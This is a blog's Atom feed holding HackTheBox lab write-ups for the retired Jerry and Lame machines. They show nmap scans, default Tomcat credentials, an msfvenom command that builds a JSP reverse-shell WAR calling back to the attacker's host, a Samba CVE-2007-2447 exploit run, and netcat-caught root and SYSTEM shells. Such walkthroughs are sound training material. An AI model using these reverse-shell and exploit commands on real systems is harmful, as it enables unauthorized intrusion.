<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-08T14:03:38+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Netmon Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/" rel="alternate" type="text/html" title="Netmon Machine Writeup- HackTheBox" /><published>2020-12-08T05:00:00+05:30</published><updated>2020-12-08T05:00:00+05:30</updated><id>http://localhost:4000/2020/12/08/HTB_Netmon-Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/"></content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Anonymous FTP login" /><category term="PRTG Network" /><summary type="html">A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through RCE exploit on PRTG Network Monitor.</summary></entry><entry><title type="html">Jerry Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/" rel="alternate" type="text/html" title="Jerry Machine Writeup- HackTheBox" /><published>2020-12-03T16:00:00+05:30</published><updated>2020-12-03T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/03/HTB_Jerry_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;Open Ports Enumeration&lt;/li&gt;
  &lt;li&gt;Web Service Enumeration&lt;/li&gt;
  &lt;li&gt;Default credentials identified&lt;/li&gt;
  &lt;li&gt;Reverse shell deployed as ‘war’ package&lt;/li&gt;
  &lt;li&gt;Foothold gained as SYSTEM user&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;Identifying Apache Tomcat default credentials&lt;/li&gt;
  &lt;li&gt;Deploying reverse shell as war package&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
&lt;p&gt;The open ports enumeration through targetRecon&lt;sup id=&quot;fnref:fn1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, had identified only one open port, web service, &lt;strong&gt;HTTP&lt;/strong&gt; (8080). 
The scan had not identified any known vulnerabilities through vulnerability scan. The results of the scan are given 
below.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/HTB/Tracks/Beginner/Jerry/ targetRecon 10.10.10.95
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		8080    http-proxy
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 8080 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-03 15:35 IST
Nmap scan report for 10.10.10.95 (10.10.10.95)
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 563.19 seconds

[+] Summary 
8080    http-proxy      Apache Tomcat/Coyote JSP engine 1.1
				No vuln found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;web-service-enumeration&quot;&gt;Web Service Enumeration&lt;/h1&gt;
&lt;p&gt;Browsing to &lt;a href=&quot;http://10.10.10.95:8080&quot;&gt;http://10.10.10.95:8080&lt;/a&gt; revealed an &lt;em&gt;Apache Tomcat&lt;/em&gt; installation, with a link to 
&lt;a href=&quot;http://10.10.10.95:8080/manager/html&quot;&gt;Manager App&lt;/a&gt;. The error page, received after attempting multiple wrong 
credentials revealed the default credentials &lt;strong&gt;tomcat:s3cret&lt;/strong&gt;. The same is shown on the image given below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/manager.png&quot; alt=&quot;Default Credentials&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
&lt;p&gt;Using the default credentials gave access to the &lt;strong&gt;Admin Panel&lt;/strong&gt; of Apache Tomcat installation. A &lt;em&gt;reverse shell&lt;/em&gt;, as a
&lt;strong&gt;war package&lt;/strong&gt; was then generated using &lt;strong&gt;msfvenom&lt;/strong&gt; as shown on the following command.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.3 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9095 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; revShell.war
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The &lt;em&gt;war&lt;/em&gt; package was then uploaded through the admin panel. A &lt;em&gt;netcat&lt;/em&gt; listener on port 9095 was initiated, and the 
reverse shell was triggered by visiting &lt;a href=&quot;http://10.10.10.95:8080/revShell/&quot;&gt;http://10.10.10.95:8080/revShell/&lt;/a&gt;. This 
resulted in a shell, as a &lt;strong&gt;SYSTEM&lt;/strong&gt; user being caught on the listener. The same is shown on the section given below.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 9095                                                                           
Connection from 10.10.10.95:49192
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem


b4bygroot@arcolinux:~/HTB/Tracks/Beginner/Jerry % nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 9095
Connection from 10.10.10.95:49195
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;cd C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags&amp;gt;type &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/flags.png&quot; alt=&quot;SYSTEM Shell&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-owned&quot;&gt;System Owned&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/systemown.png&quot; alt=&quot;System Owned&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:fn1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Apache Tomcat" /><category term="war deployment" /><category term="without metasploit" /><summary type="html">A retired windows box from HackTheBox, owned by abusing default password in Apache Tomcat installation and deploying a war package.</summary></entry><entry><title type="html">Lame Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/02/HTB_Lame_Writeup/" rel="alternate" type="text/html" title="Lame Machine Writeup- HackTheBox" /><published>2020-12-02T16:00:00+05:30</published><updated>2020-12-02T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/02/HTB_Lame_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/02/HTB_Lame_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;Open Ports Enumeration&lt;/li&gt;
  &lt;li&gt;Samba version identified&lt;/li&gt;
  &lt;li&gt;RCE for Samba version identified&lt;/li&gt;
  &lt;li&gt;Foothold gained as root user&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;Public Exploit Identification&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
&lt;p&gt;The open ports enumeration through targetRecon&lt;sup id=&quot;fnref:footnote&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:footnote&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; had identified four open ports namely &lt;strong&gt;FTP&lt;/strong&gt; (21), &lt;strong&gt;SSH&lt;/strong&gt; (22),
&lt;strong&gt;NETBIOS-SSN&lt;/strong&gt; (139) and &lt;strong&gt;MICROSOFT-DS&lt;/strong&gt; (445). The scan had not identified any known vulnerabilities through 
vulnerability scan. The results of the scan are given below.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b4bygroot@arcolinux:~/HTB/Tracks/Beginner_Track/Lame|
⇒  targetRecon 10.10.10.3
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		21      ftp
		22      ssh
		139     netbios-ssn
		445     microsoft-ds
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 21 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_sslv2-drown: 
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds

				 nmap -sV -A --script=default,vuln -p 22 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       PACKETSTORM:101052      7.8     https://vulners.com/packetstorm/PACKETSTORM:101052      *EXPLOIT*
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds

				 nmap -sV -A --script=default,vuln -p 139 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:39 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h39m33s, deviation: 3h33m46s, median: 8m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-02T03:20:12-05:00
| smb-security-mode: 
|   account_used: &amp;lt;blank&amp;gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 425.45 seconds

				 nmap -sV -A --script=default,vuln -p 445 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:46 IST
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.20s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
|_clock-skew: mean: 2h38m28s, deviation: 3h32m14s, median: 8m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-02T03:25:02-05:00
| smb-security-mode: 
|   account_used: &amp;lt;blank&amp;gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.54 seconds

[+] Summary 
21      ftp     vsftpd 2.3.4
				No vuln found
22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1
				No vuln found
139     netbios-ssn     Samba smbd 3.0.20-Debian
				No vuln found
445     microsoft-ds    Samba smbd 3.0.20-Debian
				No vuln found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;samba-service-enumeration&quot;&gt;Samba Service Enumeration&lt;/h1&gt;
&lt;p&gt;Through the scan result from the previous section the &lt;strong&gt;Samba&lt;/strong&gt; service version of the target was identified as 
&lt;strong&gt;&lt;em&gt;3.0.20&lt;/em&gt;&lt;/strong&gt;. Google-Fu with the version had identified a known vulnerability through &lt;strong&gt;&lt;em&gt;CVE-2007-2447&lt;/em&gt;&lt;/strong&gt;. Though
metasploit module is available for the vulnerability, further googling had identified a working python exploit on GitHub
by &lt;strong&gt;amriunix&lt;/strong&gt;&lt;sup id=&quot;fnref:footnote2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:footnote2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;

&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
&lt;p&gt;Before executing the exploit, the required package &lt;strong&gt;&lt;em&gt;pysmb&lt;/em&gt;&lt;/strong&gt; needed to be installed through &lt;em&gt;pip&lt;/em&gt;. 
A &lt;em&gt;netcat&lt;/em&gt; listener, listening on port &lt;strong&gt;9095&lt;/strong&gt; was initiated after which the exploit script was executed as follows.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b4bygroot@arcolinux Lame &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python usermapScript.py 10.10.10.3 445 10.10.14.3 9095
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; CVE-2007-2447 - Samba usermap script
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Connecting &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload was sent - check netcat &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This resulted in a reverse shell on the netcat listener. Enumerating further had showed that the shell received was from
the &lt;strong&gt;root&lt;/strong&gt; user, eliminating the need for privilege escalation. The same is shown on the section below.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  Lame  nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 9095                                         
Connection from 10.10.10.3:52271
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
root@lame:/# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@lame:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
0a4e1bf944cdc7df8c2f1eb56bf8030d
root@lame:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/makis/user.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/makis/user.txt
a392eccf53d48a4abf840247bd155f80
root@lame:/# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/rootShell.png&quot; alt=&quot;Root Shell&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-owned&quot;&gt;System Owned&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/machineOwn.png&quot; alt=&quot;System Owned&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:footnote&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:footnote&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:footnote2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;https://github.com/amriunix/CVE-2007-2447&quot;&gt;CVE-2007-2447 Samba usermap script&lt;/a&gt; &lt;a href=&quot;#fnref:footnote2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="linux" /><category term="samba" /><category term="CVE-2007-2447" /><category term="without metasploit" /><summary type="html">A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.</summary></entry></feed>